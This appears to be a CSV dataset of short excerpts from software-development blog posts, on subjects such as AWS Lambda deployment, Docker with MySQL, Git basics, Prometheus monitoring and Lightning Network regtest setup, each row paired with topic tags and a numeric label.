2674,"Give it a go, I would love to hear your thoughts! Sources:[1] Dawkins, Richard (1989), The Selfish Gene (2 ed. ), Oxford University Press, p. 192, ISBN 9780192860927,[2] Godwin, Mike (October 1994). [3] Graphics Interchange Format, Version 87a. [4] Seppala, Timothy J (August 2016) https://www.engadget.com/2016/08/25/giphy-capture-app-update.","['GIF', 'QA', 'Testing', 'Test Evidence']",4
2675,"We need a dedicated client to orchestrate all our OSD, MON (monitors) and RGW (Rados Gateway API S3) using ceph-deploy. To ensure a sufficient quorum, we deployed 5 OSD/MON and RGW. Each OSD has 1GB of RAM, 4GB of disk space for the system and 33GB for the user data for a total of 198GB of storage replicated twice. Therefore, all our nodes are inspected with each other with the monitoring service. It is this service that is in charge of data recovery when an OSD is lost. When a client queries the S3 API, the API queries the interface that determines the location of the resource in the corresponding OSD or the location to save the resource.","['Storage', 'API', 'Ceph', 'System', 'Servers']",11
2676,"As Ive progressed in my career Ive had to take on larger and more ambiguous problems. Often there are no experts to turn to for help, or if there is no one around me knows who that person is. One of the most useful practices Ive developed when I hit one of these large, ambiguous problems is to immediately create three lists: What I know (and can objectively prove I know)What I think I know (anything I believe to be true but cannot objectively prove)What I know I dont know (questions I dont have answers for)Organizing the information I have in this way usually has an immediately clarifying effect. When I start the list of things I know is short and the goal is to move things out of the last two lists and into this list. I can use the list of questions I dont have answers for as my first to do list. If there are others around me available to help, they can look at these three lists and immediately get up to speed.","['Programming', 'Tech', 'Life Lessons', 'Learning', 'Culture']",4
2677,"I used to be a big believer in self-documenting code. Ive dogmatically stuck to this at the expense of writing comments for a long time. I still believe in writing clean, easy to follow code but Ive learned that there is more that needs to be communicated besides just how the code works. Ive had sections of code that I find myself re-explaining to others over and over. Ive had whole systems I continually have to give walkthroughs of. Now, I lean towards over-explaining and putting more detail than may be necessary. There is the risk of these comments becoming out dated but in practice Ive so rarely encountered this happening it hasnt become a major issue.","['Programming', 'Tech', 'Life Lessons', 'Learning', 'Culture']",9
2678,"People tend to get the most excited about their own ideas. At least, the ideas that they think are theirs. If you try to convince someone to think a certain way, especially if it means changing how they feel about a subject, you often be met with defensiveness. If you can help someone reason about to the conclusion you want them to reach they are more likely to support that conclusion.","['Programming', 'Tech', 'Life Lessons', 'Learning', 'Culture']",4
2679,"If you work full time, you spend at least eight hours a day working, five days a week. That is a significant amount of your waking life. That means the people you work with have an incredible amount of influence over you and your overall happiness. The best teams Ive worked with are the teams who I genuinely enjoy spending time with regardless of what we are working on. This means that I care a lot about who my team hires. It also means when I look for new teams I go out of my way to learn about the team Im considering joining.","['Programming', 'Tech', 'Life Lessons', 'Learning', 'Culture']",0
2680,"In school I thought that object oriented programming was the ultimate way to tackle everything, and functional programming was for high minded academics. If only I could go back in time and shake myself. Every paradigm has something to offer. Every paradigm is like a different tool you can use depending on the problem you face. Over time Id say most of the code I write could best be described as functional-ish. Stateful design can be difficult to maintain and lack thread-safety. Mutability can be simpler to understand in some cases more efficient. Use the right tool for the job, while respecting the idioms of your language.","['Programming', 'Tech', 'Life Lessons', 'Learning', 'Culture']",9
2681,"I have half-jokingly given this advice to some developers on my team but I honestly believe it. Difficult problems are difficult because of how much you dont know. The easiest problems to solve are the problems you know the most about. The more you learn about the context of a problem the easier that problem is to solve. Always look for opportunities to read more, talk to experts, run experiments, whatever you need to learn.","['Programming', 'Tech', 'Life Lessons', 'Learning', 'Culture']",4
2682,"Its been almost 7 years since I quit my last job. Back in 2011 I was a freshly baked postgraduate in Melbourne. I was entering my 30's and the indie game renaissance was in full swing. When my contract ended I decided to leave academia and pursue my own path in game development. I then began working on a game called Moonman. Fast forward some long years and that game, now called Moon Quest, has just been released on Steam Early Access and itch.io.",['Game Development'],2
2683,"For instance, say you want to make a game with an infinite world where the player can keep walking in one direction and never reach the edge of the world. You will need to build a decent amount of technology to support that. A couple of years later you realise (from a game design perspective) that, no, you dont actually need an infinite world. Throw away all those data structures and algorithms that youve built. The 3 months you spent building a fluid system that works on an infinite grid? A simple array of fluid cells will work! Your game idea doesnt exist in a vacuum, and if it did itd probably evaporate because its so amorphous. This benefits our time-stretching goal in the following way: by constantly monitoring similar games that are released you can simply change your game to be less like them. Do all those games have sandbox in the description? Just make yours an anti-sandbox with a specific goal, thatll surely differentiate your game in the market. Throw away any ideas of modding and instead focus on providing more unique content. All that matters is that the idea for the game is in flux, constantly adapting to the marketto the extent that you cannot even write a single paragraph explaining what it is.",['Game Development'],5
2684,Every feature needs to be tested. Remember: if you change one thing then all other things must be re-tested because you may have broken something.,['Game Development'],13
2685,"Game development involves many different disciplines and you should definitely try to master all of them. My preferred way to learn is by finding an online community and involving myself in the competitions and events they hold. If this sounds too simple then you could always start your own community. Maybe its called Pixel Dailies and has become so big it requires 2 full-time moderators. Well, I guess you have the time to spare! Those are just some things a developer can do to delay a project. Some more ideas are running an unconference, releasing an i OS game, making an infinite star wars crawl generator, creating twitter bots, and well you get the point.",['Game Development'],2
2686,"In order for __url__ to work properly, it needs to be executed frequently, but no more than once per minute. However, the default behavior does not require you to set up a real system level cron job on your server. Instead, it uses a piggyback method on every incoming request. When a request comes into the site, Word Press will generate an additional request from itself to the __url__ file over HTTP(S). The default method works perfectly fine on a small site with very few visitors per hour. However, when implemented on a medium or larger site or even a site that is being scanned by bots (which is very common these days), this means you get twice fold whatever traffic you are currently handling. It becomes a rudimentary DDo S attack against yourself. This is because the cron is being executed multiple times a minute using an HTTP request. The HTTP request generates additional overhead by having to generate, negotiate and establish the connection over a network socket. It even impacts the effective capacity of your underlying web server. This solution does not fare well in most situations, and honestly, it should be removed as the default behavior due to its propensity to be abused or turned into an attack vector on a server just from regular traffic.","['WordPress', 'Cron', 'Web Hosting', 'Rant', 'Cpanel']",11
2687,"I believe it is up to the software engineers that develop our digital world to impress upon themselves a sense of responsibility for their products. Word Press is ubiquitous these days and with auto installer software, like Softaculous, Word Press gets installed on a very large majority of sites. They are installed with the default behavior enabled, which is essentially an attack vector on any server. Now with the hosting industry being so prevalent in our lives, many people have Word Press sites and do not know about this issue until it cripples their site. The default integration is sorely inadequate and should be removed. Today on one server alone, I found over 500 different installs of Word Press and watched as a bot hit each site on the server. Every one of those sites suddenly became a liability for the servers stability.","['WordPress', 'Cron', 'Web Hosting', 'Rant', 'Cpanel']",17
2688,"Here is example code for the constructor function, render() method and returning: The constructor function parameter includes the following objects:params.content Item Data: Contains the content item, including its name, description, ID, and data. For example, the field blogpost_ title in the content item can be accessed using params.content Item Data.data[blogpost_ title].params.scs Data: This object passes in information when the constructor is called from within sites. This object doesnt exist for content layouts rendered in third-party applications. This object contains the Sites SDK, the method content Trigger Function to raise a trigger, and the Details page links.params.content Client: This is the content Client object created from the Content Delivery SDK. It is therefore configured with the appropriate parameters for the content server. If you need to make additional calls to the content server, you can use this content Client object rather than creating your own. This object contains client APIs for the content. APIs are available to query, search, and get content items and their content types. Other helper APIs are also available; for example, expand Macros() to expand the macros used in rich text.",['JavaScript'],15
2689,"This process can be streamlined by using AWS Code Commit and an AWS Lambda function. Code Commit provides source/version control servers which allows you to create Git repositories similar to Git Hub. But in contrast to Git Hub, the repos can be set to private even in the free version. The Lambda function can be build in such a way that it is triggered when a new commit is pushed. In this case, it should take the code from the repo and upload it to the S3-bucket. This means if a new feature is ready for production we just need to commit and push the code. The rest is handled by the Lambda function.","['AWS', 'AWS Lambda', 'Amazon S3', 'Development', 'Python']",18
2690,"Lets have a look how we can accomplish that. It is actual not too complicated. (I assume that you already have an AWS account and are familiar with the basic AWS features. )First, we open the AWS S3 console and create a new S3 Bucket that is used to host our website. We have to provide a unique name for the bucket but otherwise use the default settings. Afterwards, we open the bucket, go to the Properties-tab and activate Static website hosting. We select Use this bucket to host a website and define the index document of our website (e.g.","['AWS', 'AWS Lambda', 'Amazon S3', 'Development', 'Python']",7
2691,"Furthermore, we have to create a new IAM user which we will use for signing in from our Git client. We go to the AWS IAM console, select Users from the left menu and click on Add user. Lets name this user code Commit and select Programmatic access. On the next page, we select Attach existing policies and search for the policy: AWSCode Commit Full Access. This policy allows our new user to read and write the Code Commit repositories. We attach it to the user and finish the creation. Next, we open the new user in the AWS console and go the Security credentials-tab. We scroll down to the HTTPS Git credentials for AWS Code Commit-section and generate a Git username and password. This are the credentials we will actually use to connect the Git client to our new repo. Afterwards, we can already push the first commit to the repository.","['AWS', 'AWS Lambda', 'Amazon S3', 'Development', 'Python']",7
2692,"First, we define a trigger that starts the function. We choose Code Commit form the Add triggers-list in the Designer-section. If we select it, we can fine-tune its properties in the Configure triggers-section below. We have to select the name of our repository and define a trigger name. We also have to choose an event the trigger is listen for. We use Push to existing branch and select the master branch form the next dropdown. (In order to see any branches in the dropdown you first have to push at least one commit to the repository.)","['AWS', 'AWS Lambda', 'Amazon S3', 'Development', 'Python']",15
2693,"The very first line is about the version of docker compose itself. Right now version 3 is available but since I have an old installation so I stick with it. The services section will contain the list of all the tools/services you are intended to run. Since I will be making websites in PHP so I just named it as website. You may dedicate it your friend or sweetheart, doesnt make any difference. Just do remember that this name will be used to communicate with other containers. Under the website section I set container_name which is obviously for setting the name of the container. The image section is timilar to set the tag in docker run command. Under the build you will find context section. It is actually to look for the Dockerfile. In this is it is in the current directory. If you already have built the image separately then you may ignore this part but since the objective is to use a single file to manage everything then its good to opt for it.","['Docker', 'PHP', 'DevOps', 'MySQL', 'Web Development']",7
2694,"Now, I am going to install My SQL. I am going to use My SQL v8. The __url__ will now look like this: Here you see that envrionmentsection contains parameters related to connecting with My SQL server. You may remove MYSQL_USER and MYSQL_PASSWORD section but you gotta set the root password then for sure. The default 3306 port is mapped to 8082 port. By setting restart:always means that whenever the container goes up, My SQL will also be started. Also notice the depends_on under websitesection. It means that in order to run this service (PHP), My SQL service must be up.","['Docker', 'PHP', 'DevOps', 'MySQL', 'Web Development']",7
2695,"Docker let you run a command inside a container with the help of docker exec command. For instance I want to logon to My SQL, howd I do it? First you must know My SQL image name, for that run docker ps -a on terminal. If you remember we set the name of the container as mysql-server-80, so the command will look like:docker exec -it mysql-server-80 bash -l-it means an interactive terminal and we are going to use Bash shell here. Once logged in you should see something like below: You can run ls command or any other command here. If everything is fine, the screen below should welcome you: This is fine but howd I interact My SQL outside of docker. What if I want to connect my favorite My SQL client with the My SQL server inside the container. Docker let you to do it with the help of port forwarding.","['Docker', 'PHP', 'DevOps', 'MySQL', 'Web Development']",7
2696,"The best engineers in the business find ways to push themselves outside of their comfort zone to learn new things. By eliminating this barrier we helped provide an unobstructed path for our engineers to do just this. The hardest type of engineer to find, let alone hire, is the full stack engineer*. Why would we want to put up obstacles to prevent our own talent from trying to achieve that? Weve seen a higher level of cross-discipline collaboration across our teams. Engineers now have the agency to try things outside their previous lanesas well as outside of their comfort zones. This new approach has resonated at hiring events, where applicants have found this philosophy interesting and felt assured that at Insider, they wouldnt be locked into a specific track or technology.","['Insider', 'Team Building', 'Engineering Mangement', 'Engineering Culture', 'Improvement']",12
2697,"The process for Deezer authentication is pretty similar to Googles one. First, getting credentials Visit Deezer for developers Create an app Set http://127.0.0.1:8000/social/complete/deezer/ to Redirect URL after authentication And again, here youll have to add your production redirect URL once you have one Now you should see Application id and a Secret Key in your app. Add them to projects settings.py Again, add Deezer to AUTHENTICATION_BACKENDS in projects settings.py And again, a link to sign in via Deezer You might want to ask for some permissions. For example, Deezer does not provide users email by default. You need to ask a permission for email. You can check out a full list of available permissions in official permissions documentation.","['Django', 'Python', 'Web Development', 'Authentication', 'Technology']",7
2698,"When a user signs in they go through a so-called pipeline. Heres how the default pipeline looks like If you like to, you can read a description for each stage of the pipeline. But what interests us at the moment is the 7th step, social_core.pipeline.social_auth.associate_by_email which is disabled by default. What it does is it Sounds like exactly what we need. Just uncomment the line with this setting and copy the pipeline to your projects settings.py You can read more about in the official docs for pipelines. Well build a custom pipeline in the next part of the series.","['Django', 'Python', 'Web Development', 'Authentication', 'Technology']",18
2699,"In my last article, we discussed replacing monolithic APIs with more nimble Serverless technology. We had a lot of questions about how to develop Lambda projects. In this article, were going to write a Node JS script that takes any number of Lambda Functions, packages them up, and deploys them to Amazons white puffy cloud. Later articles will build on this script until we have the tools we need to develop Serverless APIs. As a reminder, we want a staged development environment ( something like dev, staging, and production ) that we can move our code through as we put our system together. To do that, we need to take advantage of Lambda Function aliases and versions.","['AWS', 'Lambda Function', 'Software Development', 'Software Architecture', 'Lambda Architecture']",10
2700,"In order to develop Lambda Functions we need some way to organize our coding initiative. Here is my proposed folder structure for a Lambda project: Within this structure, you can maintain multiple Lambda Function projects in a single place. Each project has its own set of dependencies. This works well if youre creating more than one API for your project ( like admin-api and app-api ). An important thing to note here with this deploy script is that each Lambda Function in a project gets packaged up with the common and node_modules folder. In most cases this is fine, but it can be a problem when one of your Lambda Functions uses something like PDFKit. In this scenario, it would be wise to create a separate project folder for Lambda Functions that use PDFKit. This way you dont weigh down a bunch of Lambda Functions just because a couple of them are using a heavy dependency. We want to keep each Lambda Function as light as possible.","['AWS', 'Lambda Function', 'Software Development', 'Software Architecture', 'Lambda Architecture']",15
2701,"Our __url__ script will have an object that defines information about our stages and our AWS setup. Heres what it looks like: The stage object holds information about each stage of our development environment. We will flesh this section out in later articles. The aws object contains information about your AWS account and default values for Lambda Functions. Lets look at some of the less obvious attributes in more detail.api Number Dont worry about this value right now. We will develop our __url__ script in a later article.initial Stage Specify the first stage in your development cycle. Im using dev, but others might like to use test or beta. These should coincide with your API stages.function This object provides settings for our Lambda Functions at each stage.function.default All settings here will be applied to Lambda Functions, unless these settings are overwritten by a stage, or settings in a Lambda Functions meta object.function.default.role The name of the role in your AWS account that your Lambda Function uses.function.default.vpc Lambda Functions can be run externally, internally, or internally with a NAT. Your Lambda Functions meta object defines which to use, or provides its own set of Subnet Ids and Security Group Ids.function.default.vpc.external This setting is the default and the Subnet Ids and Security Group Ids should be left empty. This allows a Lambda Function to connect to the internet.function.default.vpc.internal This setting makes a Lambda Function private and allows it to connect to RDS( Relational Database Service ). You use this setting when connecting to a database. You cant connect to the internet with this setting.function.default.vpc.internal With NATIf you need to connect to a database and to the internet, or other services within AWS like S3 or SNS, then you need to use this setting.","['AWS', 'Lambda Function', 'Software Development', 'Software Architecture', 'Lambda Architecture']",15
2702,"The Deployer We open and read in the zip archive that we just packaged, pull in our meta object from the Lambda Function that we are deploying, and then we use the AWS SDK to determine if this Lambda Function exists or not. An update is handled a little differently than a create. In either case, we use a function to determine the settings to deploy.get Params This function returns the settings for this Lambda Function based on the default values, the stage values, or the Lambda Functions meta values. The Lambda Functions meta values take highest precedence, while the configs default values take lowest. For the vpc setting, you can specify an option on the Lambda F __url__ by setting it to a string for external, internal, or internal With NAT, or you can specify an entirely unique VPC, complete with Security Group Ids and Subnets.deploy New If we deploy a new Lambda Function, then we also create an Alias( in this case dev ) that points to this functions $Latest version. Note: Keep in mind that when we deploy a Lambda Function it is deployed with the project name as well. In the example folder, our __url__ Lambda Function becomes __url__ in the AWS console. Since Lambda Functions in the console all sit at the same level, we prepend the project name to them to avoid conflicts( I was a middle child, so I dont like conflict ).","['AWS', 'Lambda Function', 'Software Development', 'Software Architecture', 'Lambda Architecture']",15
2703,"Thats all there is to it for deploying your Lambda Functions to a dev environment. We can now deploy from a command line without even jumping into the AWS console in your browser. But, your Lambda Function is sitting there in the cloud bored to death because nothing is triggering it. If you want to test your Lambda Function now, you have to login to the console, setup some test data and then run it from there. Eventually we want to connect an API to our Lambda Functions. But before we get to that part, lets get a testing framework setup so we can test our Lambda Functions locally. Well do that in the next article.","['AWS', 'Lambda Function', 'Software Development', 'Software Architecture', 'Lambda Architecture']",15
2704,"To put this in context, the people that started the project were interns, and I was still in university. There was no-one around to guide us, to teach us, to stop us falling into the pitfalls a senior developer would know about and anticipate. There was no leadership from someone who knew what they were doing. This remained throughout my entire time on the project. We simply didnt know what we were doing was completely wrong.","['Software Development', 'Software Engineering', 'Programming', 'Leadership', 'Reflections']",0
2705,"During one particular summer, the number of people on the project increased five-fold. They were all internspeople at the same level as the permanent staff or lower. During this time the permanent staff were tasked with managing the interns. They were split into teams of three and we were each responsible for one team.","['Software Development', 'Software Engineering', 'Programming', 'Leadership', 'Reflections']",0
2706,"This was probably the hardest part of the project for me. I had experience leading developer teams during my university courses. Nothing prepared me for this though. I was now not only responsible for my own work, but that of the interns as well. They were great, talented people, but for many this was their first experience in a commercial development environment. I was lucky, my team were great. They performed well, but the result was the same; Issues that show through from inexperience, both theirs and mine.","['Software Development', 'Software Engineering', 'Programming', 'Leadership', 'Reflections']",2
2707,"On this particular project, I was lucky in some ways. I was given one of the fastest machines of the time to develop on. This was certainly not the case for some of the other developers. Others were given the slowest machines Ive ever seen. These things had been around for probably ten years before those poor souls got to use them. The keyboards were worn down from years of use, and the trackpad buttons had huge marks on them from having worn through the top layer of plastic.","['Software Development', 'Software Engineering', 'Programming', 'Leadership', 'Reflections']",2
2708,A lot of the issues we faced came down to a lack of experience. We didnt know how to set up a project properly. We didnt know how to set up our environments correctly. We didnt have the tools we required. We didnt have the knowledge we required. There was simply unchecked navet running abundant.,"['Software Development', 'Software Engineering', 'Programming', 'Leadership', 'Reflections']",10
2709,"Now you are ready to use the whole AWS ecosystem. For example, you can use services such as: Dynamo DB (No SQL)Elasti Cache (Redis/Memcache)Elastic Search Auroraand so on. Covering the benefits of AWS services is not within the scope of this post. Most of these services are serverless, like the Lambda service. This means that they automatically scale and you are charged in a pay-per-use model. Therefore, you can setup an API that can serve a huge amount of requests without setting up a cluster of servers.","['AWS', 'Lambda', 'Lumen', 'Laravel', 'PHP']",11
2710,"First, create a public RDS Postgresql instance and write down the database host, name, user, and password. Connect to the DBMS using your favourite SQL client to create a users table and insert a record in it: The PHP code to query the database is already included in the sample routes/ __url__ file: As you can see, the database name, host and credentials are taken from the environment. You might add them to __url__ file, but I recommend setting them as Lambda Environment variables. So, log into your AWS console again and select Services > Lambda > Functions. Click on my-first-serverless-lumen-api to open the Lambda page. Click again on the Lambda function in the Designer. If you scroll down in the page, you will find a section where you can insert your environment variables. Set the DB_CONNECTION=pgsql, and DB_HOST, DB_DATABASE, DB_USER and DB_PASSWORD variables according to your RDS configuration.","['AWS', 'Lambda', 'Lumen', 'Laravel', 'PHP']",7
2711,"Now you are ready to invoke the REST endpoint: The output should be something like: Done! In this example, we have created a public instance of the RDS database. You should be aware that this is not considered best practice from a security point of view. However, if you create the RDS database in a VPC, as recommended, you need to run the Lambda function in the VPC as well. For example, it increases to about 10 seconds the boot time for cold starts. In addition, if you query your database from the Lambda function, you need to take into account that Lambda can quickly scale, so your database might receive hundreds of connections. A serverless database would be much better for this scenario.","['AWS', 'Lambda', 'Lumen', 'Laravel', 'PHP']",11
2712,"The operand error in the SRI was not sufficient for system failure. The specification and design of the SRI exception handling mechanism also contributed to the failure. In the event of any exception, the system specification stated the failure should be indicated on the data bus, the failure context should stored in an EEPROM memory, and finally the SRI processor should be shut down. The reason behind this acute action was the engineering culture within the Ariane program focused on hardware failure instead of software failures since the former occurred more often than the latter. A rational approach to handling random hardware failures is to shutdown active systems and switch to the backup. However, a better approach in this software fault scenario would have been to provide best-effort estimates of the required altitude, position, and velocity. The inquiry board wrote that software should be assumed faulty until applying the currently accepted best practice methods can demonstrate that it is correct.","['Software Development', 'Quality Assurance', 'Project Management', 'Ariane 5 Flight 501', 'Tech History']",13
2713,"When highlighting the impact and value your work brought to each organization (team, product, etc. ), youve got to provide real numbers whenever you can. Think about the last time you got a raise. Both the dollar amount and percentage increase are real values your brain can latch on to and determine if youre getting shafted or not. Which one of those metrics would be the best result for you? Likewise, if you wrote some software that automated something, youre saving time for actual humans. If you cut out unnecessary spending on redundant services (I once learned my job at the time had websites spread across three different hosting companies for no reason other than why not, so I consolidated and saved money), write down the savings.","['Software Development', 'Resume', 'Careers']",0
2714,"So, assuming that we were correct in thinking that replacing our systems was both necessary and feasible (lets assume both for now), one question still remains for me: why wont we be doing this again in ten years? Are these millions of dollars still worth it if we dont get more than a few years of use from these new systems? Or, put another way, are we just rebuilding the same inflexible systems? Though most experienced developers probably get this, I first heard it from Udi Dahan how common this cycle is. It goes like this: An organization builds a software system Over time the system becoming unmaintainableto the point that the organizations believe a rewrite is not only desirable but necessary The system is rewritten In the best case, project actually succeeds, and the old system is retired; though often the old system lives in parallel with the newer systems, more-or-less in perpetuity Before long, the new system becomes treated as a legacy system; its tech stack goes out of date; institutional knowledge about how to maintain it dissipates; budget and will to keep it updated disappears The cycle repeatswe need to rewrite this and build a new system! So we rewrite every 10 years. Well, Im pretty sure our executives werent planning to lay out this kind of money that often. But the real reason to avoid this cycle is because rewrites are risky and expensive compared to iterative development. I wont go ahead and rehash Agile, Lean, Continuous Delivery, and TDD, but they all are based on this principle: iterative development where customers are continually seeing value and changes are being integrated is cheaper and carries far less risk.",['Microservices'],12
2715,"The technology is always changing, and this new tech stack will be considered new for two years at the most. This one isnt even worth discussing. If your new platform doesnt consider plugging in completely different technologies in the future, so that future components/services can interop and evolve alongside the existing ones, you will be screwed.",['Microservices'],16
2716,"So what are these patterns and practices? Well, I have some opinions on this! First, heres what doesnt matter: Certain design patterns, like n-tier architecture, that may be appropriate for some services more than others The work-tracking system (e.g. )How individual teams are working, e.g. scrum vs. kanban Almost anything tech-related: the data store the team is using (relational vs. graph vs. document), whether its in the cloud or on-premise, the tech stack So what is the differentiator for Operation Powerade? What specific things might make this transformation stick? While theres no silver bullet, here are three things I think can make a decisive difference, allowing a transformation to survive for the long term: Software teams aligned with business capabilities Team independence service/component independence (i.e. dont be obsessed with reuse)Well-understood contracts between services There are so many things that an organization should do well that are not included here: TDD, observability, everything Janelle Klein talks about in her talk on How to Break the Software Rewrite Cycle (slides), the (excellent) principles of Continuous Delivery. So how can we leave these things out? Because while they may make or break a team or service, with proper boundaries in place the organization as a whole can survive the failure of one team.",['Microservices'],12
2717,"The main objection to this is that were leaving money on the table for any components we can reuse. Developers in particular are conditioned to love reuse. Executives think that reuse will save future $$. But it depends on what we want for our system, reuse (i.e. the minimizing of wasted effort) or flexibility (i.e. As Jessica Kerr writes, Reuse is the enemy of change.",['Microservices'],12
2718,"Next override the super generate method: We are returning a stream of File objects. These represent files that are to be generated by protoc We are filtering it by checking if the proto to generate is in the list of files to generate. You will be passed all the proto files, even imported ones, so be sure to filter these out. (Unless you want to generate code for them)We then call our other method to generate our code in handle Proto File Nothing too fancy here. Just be aware that the java package could come from two different locations. Either implicitly equal to the proto package or explicitly with the proto option.",[''],15
2719,"Version control is the management of changes to documents, code, or any other set of information. For example, think about an essay youre writing. You have the first draft with the name essay_rev1. Then, you write another draft named essay_rev2 and so on and so forth. Programs like Git allow you to easily track the changes you make with each revision without having to rename and re-save. G __url__ gives you all of these tools in one organized space, as well as the ability to share your code openly with other userscool stuff! One of the first things you want to do as an amateur programmer is to start a Git Hub account. Its free to sign up and is an awesome (organized) way to store all of the projects you will be working on in the near future. Its also a great place to check out other cool projects out there on the web.",['Git'],18
2720,"So you have finally created your Git Hub account, now what? The first in doing so is creating a new repository. Go to your profile page, and click on the Repositories tab. Then, click on the little green button in the top right-hand corner that reads New. But wait What is a repository? Repository is another name for project. Basically it will include all the files pertinent to your project. It also shows you the history of revisions. but we will get to that later.",['Git'],18
2721,"In order to commit, you must stage your changes first. This is to prepare all of the edits youve made to become a permanent record (commit) in your history. To do this, type git add. is there to stage ALL the changes you have made). Alternatively, you can type git add <file name> to only stage one specific file.",['Git'],18
2722,"Now that we have made changes, staged, and committed, we need to push them to Git Hub. Pushing is the process of taking the code you have locally and uploading them to Git Hub. The Git Hub remote is the place where you initially copied the code from (remote = fancy way of saying copy of repository). The remote name in this scenario is origin. origin is the default name given to the remote by Git Hub when we fork the project. In order to push this back to Git Hub, enter into your terminal git push origin master. But wait, where did master come from?! Now that you are familiar with committing and pushing up to Git Hub, lets discuss branching! So far, the changes you have made have been pushed up to Git Hub on the master branch. This branch is the linear list of changes from your initial repository. You can create a new branch and work on a feature of your code to then later merge it with the master branch, as seen below.",['Git'],18
2723,"Merging is a way to combine changes. You can make multiple branches and have multiple merges across your repository. It can be as complex or as simple as you want it to be! Lets try to merge these changes with the master branch. First, go back to your master branch by typing git checkout master. Congrats, you just completed your first merge! Now that this is merged locally, dont forget to push these changes to Git Hub with git push origin master.",['Git'],18
2724,Now say you are working with your friend Tez on this repository. You made him a collaborator and have both cloned the repository locally. Tez is working on a branch called tez. Tez has committed and pushed his changes to the origin and now you want to see them. How would you do that from your terminal? By using git fetch origin tez and then git checkout tez. You have added Tezs branch to your local repository from the origin repository! Now you can see all of the changes Tez has made and merge them to the master and push them to the origin.,['Git'],18
2725,"We have been studying the field for a while now. Constantly getting new insights that could open new opportunities for doing things unimaginable before. Unfortunately, we simply cannot get the grasp of it. Basic example: I can write down and train a recurrent neural network to identify cats on its own; I cant, however, decipher the steps (or the rationale) taken by the neural network to make such decisions. Besides that, every implemented system is filled with tons of bugs no one knows about. And yet, it powers everything around us nowadays.","['Cloud Native', 'Microservices', 'Metrics And Analytics', 'DevOps', 'Observability']",5
2726,"Probability and Statistics is becoming ever more valuable in todays software development field. And, if applied to metrics, it can be a powerful tool to help develop, deploy, operate and support running software. Given that, lets jump to some important definitions: We are not talking about functionality here. Every running software is like a human body: unpredictable, but giving out signals of its health to the brain. From these signals, the brain makes its way to devise symptoms that could later be linked to a serious disease. A physician can then prescribe a medicine or perform a surgery to fix it and let the patient go back to its normal life.","['Cloud Native', 'Microservices', 'Metrics And Analytics', 'DevOps', 'Observability']",5
2727,"Good:)In the software development world, a box usually means isolation of some kind. For example, every internet browser implements a Sandbox that securely isolates itself from the Operating System. While inside this box, one can build whatever she wants. Like a playground, on the Javascript beach.","['Cloud Native', 'Microservices', 'Metrics And Analytics', 'DevOps', 'Observability']",19
2728,"We are helping a big public bank in Brazil conduct an important project to find and predict production issues on the banks private cloud ecosystem. It cannot, in any circumstances, considerably affect the performance of the running instances. After a period of research and experimentation, we decided to give a shot to the tuple: Prometheus and Grafana.","['Cloud Native', 'Microservices', 'Metrics And Analytics', 'DevOps', 'Observability']",10
2729,"So, in order to prepare for the worse, it would be nice to predict if something is wrong. There are mainly two ways of predicting issues: Comparison analysis: lets say you know the new release didnt change much of your system. So you can affirm, for example, that the error rate of your requests should not change. If it changes by an amount you consider odd, like 20%, you could notify your SRE and then act on the possible problem;Time-series analysis: if new versions are coming everyday, sometimes is complicated to determine a signature behaviour for your system, making it difficult for a comparison analysis. To account for that, Prometheus provides basic operations that use Linear Regression and Extrapolation. For example, you know its weird when your average request latency is near to a historical maximum; to detect it beforehand you could use the predict_linear function above and see if its close to reaching that threshold. This should be calculated over a good range of time to reduce uncertainty.","['Cloud Native', 'Microservices', 'Metrics And Analytics', 'DevOps', 'Observability']",13
2730,"If we would like to plot how the HTTP resources are behaving in terms of its error proportion, we could verify how many errors occurred in the resources between windows of 1 minute and divide that by the total count of requests to those same resources: This tool extends Prometheus capabilities in how data analysis dashboard can be communicated to possible stakeholders. It is very lightweight and offers basically no knowledge overhead. Once you learn Prom QL, you are definitely ready to use Grafana! Metrics are only one of the principles of observability for application performance management. It gets complemented by tracing and logging. When combined together, and done right, they can be a powerful tool to transform your headaches into a peaceful mind. Here is a good article to get the nuances behind these different concepts.","['Cloud Native', 'Microservices', 'Metrics And Analytics', 'DevOps', 'Observability']",10
2731,"When you run bitcoind for the first time, it automatically creates a wallet for you. So at this point, any BTC earned through mining rewards will be sent to this wallet. To mine regtest blocks simply run bitcoin-cli generate 100, where 100 is the number of blocks to be mined. If you run bitcoin-cli getwalletinfo youll now have a value under balance. These are regtest BTC coins that are perfect for testing Lightning Network applications. Now that we have a Bitcoin Core daemon running and we know how to mine regtest blocks, its time to setup our LND nodes.","['Bitcoin', 'Lightning Network', 'Application Development', 'Crypto', 'Reckless']",11
2732,"To connect to the Lighting Network, all you need is an LND node connected to an underlying chain. However, in order to send funds around the network, you must have another node to send to, or request from. One approach would be to spin up multiple VPS boxes with different Bitcoin Core and LND nodes, and then open channels between the two. A simpler approach would be to have multiple LND instances running in your machine, connected to a single bitcoind regtest node that you have full control over. A user can run as many LND nodes theyd like in a single environment, there are only three requirements: Each node must have its own dedicated data directory Each node must have its own g RPC/REST ports Each node must have its own set of TLS certificates and admin macaroons LND creates all of the necessary data files needed to run a node on startup, including the authentication macaroon files. With that in mind, after spinning up the first node, you can simply clone it (and delete the authentication macaroons/TLS certs so theyre recreated on initialization of the second node). For mac OS users, the default LND folder is at ~/Library/Application Support/Lnd (NODE A), so I just cloned it into ~/Library/Application Support/Lnd Test(NODE B).","['Bitcoin', 'Lightning Network', 'Application Development', 'Crypto', 'Reckless']",11
2733,"At this point we have two LND nodes running on different data directories, with their own set of TLS certs and authentication macaroons, and running on/against different ports. In two separate terminal shells, start both NODE A and NODE B with: In two more shells, use the lncli tool to send commands to your nodes. Run the following to create a wallet. For NODE A, we simply need to run the create command, like so: For NODE B, we must pass a few more properties: The added properties are to ensure that the second lncli call is talking to NODE B running on port 10008. Run through the wallet creation process and create yourself a password for each of the wallets.","['Bitcoin', 'Lightning Network', 'Application Development', 'Crypto', 'Reckless']",11
2734,Apache solr is a powerful open source search engine. Lucene and TF-IDF (Term Frequency-Inverse Document Frequency) are the algorithms that it is based on. It has proved to be extremely useful in solving some of the most complex problems that my team at Am Ex has faced. Apache solr is most effective when used in cloud mode also called as Solr Cloud It is a distributed architecture focused on horizontal scaling where multiple nodes run instance of solr that communicate with each other through zookeeper. Now Apache Solr comes with built in zookeeper. However it is not advisable to use it in production. Rather an external zookeeper ensemble(cluster) should be used in production environment. We use Zookeeper ensemble in production because of obvious reasons of scalability and replication factor.,"['DevOps', 'Solr', 'Apache Solr', 'Zookeeper', 'NoSQL']",8
